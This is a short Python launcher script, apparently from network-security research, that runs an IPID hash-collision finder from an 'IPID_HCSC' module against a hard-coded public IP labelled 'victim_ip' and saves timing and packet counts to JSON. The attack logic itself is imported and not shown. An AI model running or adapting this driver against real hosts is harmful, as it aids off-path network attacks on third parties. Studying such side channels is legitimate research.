# coding=utf-8

import json
import os

from IPID_HCSC.collision_find_plus import Collision_Finder_Plus


if __name__ == '__main__':
    server_ip = '172.21.0.15'
    victim_ip = '182.92.129.182'

    attack_bind_if = 'eth0'
    
    own_ip_prefix = '10.10.0.0'

    collision = Collision_Finder_Plus(owned_network=own_ip_prefix, server_ip=server_ip, 
                                      client_ip=victim_ip, bind_iface=attack_bind_if, 
                                      block_size=100, num_thread=3, verbose=True)
    collision.run()
    collision.wait_for_res()

    jstr = json.dumps({'res': collision.result, 'time': collision.cost_time,
                       'send_n': collision.send_n, 'send_byte': collision.send_byte})
    path = './search_res'
    if not os.path.exists(path):
        os.makedirs(path)

    filelist = os.listdir(path)

    with open(path + '/search_res_' + str(len(filelist))+ '.json', 'w') as f:
        f.write(jstr)
